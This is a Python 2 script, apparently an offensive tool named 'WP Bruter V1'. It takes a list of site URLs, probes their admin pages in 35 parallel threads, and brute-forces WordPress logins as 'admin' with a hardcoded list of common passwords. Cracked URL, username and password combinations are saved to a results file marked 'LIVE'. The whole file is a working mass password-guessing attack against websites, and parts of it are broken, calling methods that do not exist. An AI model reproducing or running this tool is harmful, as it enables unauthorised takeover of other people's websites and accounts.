import cookielib
import os
import random
import re
import requests
import sys
import time
import urllib
import urllib2
from multiprocessing.dummy import *

from colorama import *

la7mar = '\033[91m'
lazra9 = '\033[94m'
la5dhar = '\033[92m'
movv = '\033[95m'
lasfar = '\033[93m'
ramadi = '\033[90m'
blid = '\033[1m'
star = '\033[4m'
bigas = '\033[07m'
bigbbs = '\033[27m'
hell = '\033[05m'
saker = '\033[25m'
labyadh = '\033[00m'
cyan = '\033[0;96m'
init()
if not os.path.exists("Cms"):
    os.mkdir("Cms", 0755)
class MR008bruteV1:
    def __init__(self):
            clear = "\x1b[0m"
            colors = [31, 32, 33, 34, 35, 36, 37, 38, 39]
            x = """                                    
           ------------------           
       ------==@@@@@@@@@@@=------       
     -- -=@@@@@@@@@@@@@@@@@@@=-  --     
   -=  =@@@=@@@==@@@@@@=@@@@-      --   
  =-      -=@@@==-     ==@@@=       -=  
 -= ==     @@@@@@@     =@@@@@@-   -@ -= 
 =  @@=     @@@@@@@     =@@@@@@   @@- = 
 = -@@@=    -@@@@@@-     @@@@@@  =@@= =-
 =  @@@@-    =@@@@= =     @@@@= -@@@- = 
 -- =@@@@-    =@@= =@=    -@@@ -@@@@ -= 
  =- =@@@@-    @@ =@@@=    -@  @@@=  =  
   -=  =@@@      -@@@@@-      @@@- -=   
     -- -=@@    -@@@@@@@-    ==- ---    
       ------   @@@@@@@@@    ----       
          --------------------          
          Code By Mr 008 TN ;)
             WP Bruter V1                    
    """
            for N, line in enumerate(x.split("\n")):
                sys.stdout.write("\x1b[1;%dm%s%s\n" % (random.choice(colors), line, clear))
                time.sleep(0.05)


            list = raw_input('Your Fucking List: ')
            url = open(list, 'r').readlines()
            ThreadPool = Pool(35)
            ThreadPool.map(self.cms, url)

    def cms(self, url):
        try:
            url = url.replace('\n', '').replace('\r', '')
            op = requests.get(url+'/admin',timeout=7)
            op2 = requests.get(url + '/administrator/index.php',timeout=7)
            op3 = requests.get(url + '/wp-login.php',timeout=7)
            op4 = requests.get(url + '/admin',timeout=7)
            if "dashboard" in op.text:
                print "[+] Wordpress", url + labyadh + '\n'
                open("Cms/Wordpress.txt", "a").write(url + '\n')
                self.opencart(url)
            elif "Wordpress" in op2.text:
                print "[+] Wordpress", url + labyadh + '\n'
                open("Cms/Wordpress.txt", "a").write(url + '\n')
                self.Wordpress(url)
            elif "WordPress" in op3.text:
                print "[+] Wordpress", url + labyadh + '\n'
                open("Cms/wordpress.txt", "a").write(url + '\n')
                self.wpbrute(url)
            elif "sites/default" in op4.text:
                print   "[+] Wordpress", url + labyadh + '\n'
                open("Cms/Wordpress.txt", "a").write(url + '\n')
                self.Wordpress(url)


            else:
                print '[-] Cms Not Found -->' + url + '\n'

        except:
            print
    def wpbrute(self,url):
        try:
            user = "admin"
            passlist = ["pass", "P@ssword", "admin", "123456", "123", "password", "admin123", "12345",
                        "admin@123", "open", "test",
                        "123456789", "12345", "1234567", "12345678", "123123", "demo", "blah", "hello", "1234567890", "zx321654xz",
                        "1234567", "adminadmin", "welcome", "imadmin", "wordpress", "word", "wife", "gimboroot", "root", "root123", "pass123@", "pass123456789", "123456789A", "Fuck", "wordpass", "helloword", "666666", "access", "1q2w3e4r", "xmagico", "admin1234", "1q2w3e4r", "xxx", "pass@123"]
            for password in passlist:
                password = password.strip()
                try:
                    cj = cookielib.CookieJar()
                    opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
                    login_data = urllib.urlencode({'log': user, 'pwd': password})
                    opener.open(str(url) + '/wp-login.php', login_data)
                    resp = opener.open(str(url) + '/wp-admin')
                    final = resp.read()
                    if '<li id="wp-admin-bar-logout">' in final:
                        print lasfar + '-----------------------------------------Wordpress-----------------------------------------' + labyadh + '\n'
                        print la5dhar + "[+] Cracked Success Wp--> " + str(
                            url) + '/wp-login.php|' + user + '|' + password + labyadh + '\n'
                        print lasfar + '--------------------------------------------------------------------------------------------' + labyadh + '\n'
                        with open('Result/Result.txt', 'a') as myfile:
                            myfile.write(str(url) + '/wp-login.php' + ' |' + user + '|' + password + ' [#]LIVE \n')
                        break
                    else:
                        print '[-] Failed  Wordpress --> ' + url + '|admin|' + password + labyadh + '\n'
                except:
                    pass
        except:
            pass





MR008bruteV1()